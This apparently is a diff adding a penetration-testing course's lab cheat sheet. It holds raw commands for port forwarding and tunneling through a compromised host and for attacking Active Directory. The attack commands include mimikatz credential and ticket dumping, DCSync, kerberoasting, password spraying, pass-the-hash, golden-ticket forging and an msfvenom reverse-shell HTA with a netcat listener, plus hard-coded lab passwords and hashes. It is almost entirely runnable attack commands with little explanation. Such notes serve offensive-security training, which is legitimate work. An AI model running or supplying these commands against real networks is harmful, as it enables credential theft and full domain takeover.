@@ -1,0 +1,325 @@
+RINETD
+kali@kali:~$ ping google.com -c 1
+kali@kali:~$ root@kali:~# nc -nvv 216.58.207.142 80
+GET / HTTP/1.0
+kali@kali:~# ssh student@10.11.0.128
+student@debian:~$ nc -nvv 216.58.207.142 80
+kali@kali:~$ sudo apt update && sudo apt install rinetd
+kali@kali:~$ cat /etc/rinetd.conf
+kali@kali:~$ cat /etc/rinetd.conf
+kali@kali:~$ sudo service rinetd restart
+kali@kali:~$ ss -antp | grep "80"
+student@debian:~$ nc -nvv 10.11.0.4 80
+GET / HTTP/1.0
+root@debian:~# cat /root/port_forwarding_and_tunneling/ssh_local_port_forwarding.sh
+root@debian:~# /root/port_forwarding_and_tunneling/ssh_local_port_forwarding.sh
+kali@kali:~$ sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
+kali@kali:~$ sudo nano /etc/samba/smb.conf
+kali@kali:~$ cat /etc/samba/smb.conf
+kali@kali:~$ sudo /etc/init.d/smbd restart
+kali@kali:~# smbclient -L 127.0.0.1 -U Administrator
+
+
+
+
+
+SSH Remote Port Forwarding
+root@debian:~# cat /root/port_forwarding_and_tunneling/ssh_remote_port_forwarding.sh
+
+root@debian:~# /root/port_forwarding_and_tunneling/ssh_remote_port_forwarding.sh
+
+student@debian:~$ ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
+
+kali@kali:~$ ss -antp | grep "2221"
+
+kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 2221
+
+
+
+
+
+
+
+SSH Dynamic Port Forwarding
+kali@kali:~$ sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
+kali@kali:~$ cat /etc/proxychains.conf
+kali@kali:~$ sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
+
+
+
+
+
+
+PLINK.exe
+kali@kali:~$ sudo nc -lnvp 443
+C:\Windows\system32>netstat -anpb TCP
+C:\Tools\port_redirection_and_tunneling> plink.exe
+
+C:\Tools\port_redirection_and_tunneling> plink.exe -ssh -l kali -pw ilak -R
+10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
+
+C:\Tools\port_redirection_and_tunneling> cmd.exe /c echo y | plink.exe -ssh -l kali -
+pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
+
+kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 1234
+
+
+
+
+
+
+NETSH 
+C:\Windows\system32> netsh interface portproxy add v4tov4 listenport=4455
+listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
+
+C:\Windows\system32> netsh advfirewall firewall add rule name="forward_port_rule"
+protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
+
+kali@kali:~$ sudo nano /etc/samba/smb.conf'
+
+kali@kali:~$ cat /etc/samba/smb.conf
+
+kali@kali:~$ sudo /etc/init.d/smbd restart
+
+kali@kali:~$ smbclient -L 10.11.0.22 --port=4455 --user=Administrator
+
+kali@kali:~$ sudo mkdir /mnt/win10_share
+
+kali@kali:~$ sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o
+username=Administrator,password=Qwerty09! /mnt/win10_share
+
+kali@kali:~$ ls -l /mnt/win10_share/
+
+kali@kali:~$ cat /mnt/win10_share/data.txt
+
+
+
+
+
+
+
+5 HTTPTunnel-ing Through Deep Packet Inspection
+root@debian:~# cat /root/port_forwarding_and_tunneling/http_tunneling.sh
+
+root@debian:~# /root/port_forwarding_and_tunneling/http_tunneling.sh
+
+kali@kali:~$ apt-cache search httptunnel
+
+kali@kali:~$ sudo apt install httptunnel
+
+www-data@debian:/$ ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
+
+Are you sure you want to continue connecting (yes/no)? yes
+
+student@debian:~$ ss -antp | grep "8888"
+
+student@debian:~$ hts --forward-port localhost:8888 1234
+
+student@debian:~$ ps aux | grep hts
+
+student@debian:~$ ss -antp | grep "1234"
+
+kali@kali:~$ htc --forward-port 8080 10.11.0.128:1234
+
+kali@kali:~$ ps aux | grep htc
+
+kali@kali:~$ ss -antp | grep "8080"
+
+
+
+
+
+
+
+
+Traditional Approach 
+C:\Users\Offsec.corp> net user
+
+C:\Users\Offsec.corp> net user /domain
+
+C:\Users\Offsec.corp> net user jeff_admin /domain
+
+C:\Users\Offsec.corp> net group /domain
+
+
+
+
+
+A Modern Approach 
+
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+
+
+
+
+Currently Logged on Users
+
+PS C:\Tools\active_directory> Import-Module .\PowerView.ps1
+
+PS C:\Tools\active_directory> Get-NetLoggedon -ComputerName client251
+
+PS C:\Tools\active_directory> Get-NetSession -ComputerName dc01
+
+
+
+
+
+
+Enumeration Through Service Principal Names
+
+PS C:\Users\offsec.CORP> nslookup CorpWebServer.corp.com
+
+
+
+
+
+
+Cached Credential Storage and Retrieval
+C:\Tools\active_directory> mimikatz.exe
+
+mimikatz # privilege::debug
+
+mimikatz # sekurlsa::logonpasswords
+
+mimikatz # sekurlsa::tickets
+
+
+
+
+
+
+Service Account Attacks
+PS C:\Users\offsec.CORP> klist
+
+mimikatz # kerberos::list /export
+
+kali@kali:~$ sudo apt update && sudo apt install kerberoast
+
+kali@kali:~$ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-
+Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
+
+
+
+
+
+Low and Slow Password Guessing 
+
+PS C:\Users\Offsec.corp> net accounts
+
+PS C:\Tools\active_directory> .\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
+
+
+
+
+Pass the Hash 
+
+kali@kali:~$ pth-winexe -U
+Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e
+//10.11.0.22 cmd
+
+
+
+
+
+
+Overpass the Hash 
+
+mimikatz # sekurlsa::logonpasswords
+
+mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com
+/ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+
+PS C:\Windows\system32> klist
+
+PS C:\Windows\system32> net use \\dc01
+
+PS C:\Windows\system32> klist
+
+PS C:\Tools\active_directory> .\PsExec.exe \\dc01 cmd.exe
+
+C:\Windows\system32> ipconfig
+
+C:\Windows\system32> whoami
+
+
+
+
+
+
+Pass the Ticket 
+
+C:\>whoami /user
+
+mimikatz # kerberos::purge
+
+mimikatz # kerberos::list
+
+mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-
+2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP
+/rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+
+mimikatz # kerberos::list
+
+
+
+
+
+
+Distributed Component Object Model 
+
+kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f
+hta-psh -o evil.hta
+
+PS C:\Tools\practical_tools> nc.exe -lvnp 4444
+
+
+
+
+
+
+
+
+Golden Tickets
+
+C:\Tools\active_directory> psexec.exe \\dc01 cmd.exe
+
+mimikatz # privilege::debug
+
+mimikatz # lsadump::lsa /patch
+
+mimikatz # kerberos::purge
+
+mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-
+2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+
+mimikatz # misc::cmd
+
+C:\Users\offsec.crop> psexec.exe \\dc01 cmd.exe
+
+C:\Windows\system32> ipconfig
+
+C:\Windows\system32> whoami
+
+C:\Windows\system32> whoami /groups
+
+C:\Users\Offsec.corp> psexec.exe \\192.168.1.110 cmd.exe
+
+
+
+
+
+
+
+Domain Controller Synchronization
+
+mimikatz # lsadump::dcsync /user:Administrator
+
+
+
+
+
+
+
+
+
